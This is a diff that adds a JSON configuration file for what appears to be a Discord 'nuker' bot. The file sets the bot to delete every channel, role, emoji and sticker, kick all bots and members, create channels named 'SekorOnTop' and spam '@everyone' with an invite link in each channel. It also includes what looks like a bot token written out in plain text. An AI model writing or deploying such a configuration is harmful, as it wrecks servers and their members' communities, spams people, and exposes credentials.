@@ -1,0 +1,13 @@
+{
+  "token": "ODQ0NTQ3MDgwNDI4MDYwNzEy.GAnYhh.XVrmDEtad9-a-e1e3Q8HOV9fvzGKjzvBjneuW0",
+  "prefix": "mm",
+  "owners": ["765201883157495860"],
+  "message_to_send_in_each_channel": "@everyone **Sekor On Top!**\ndiscord.gg/sekor",
+  "channel_name_to_create": "SekorOnTop",
+  "delete_all_channels": true,
+  "delete_all_roles": true,
+  "delete_all_emojis_and_stickers": true,
+  "kick_all_bots_if_possible": true,
+  "kick_all_members_if_possible": true,
+  "nuke_on_join": false
+}
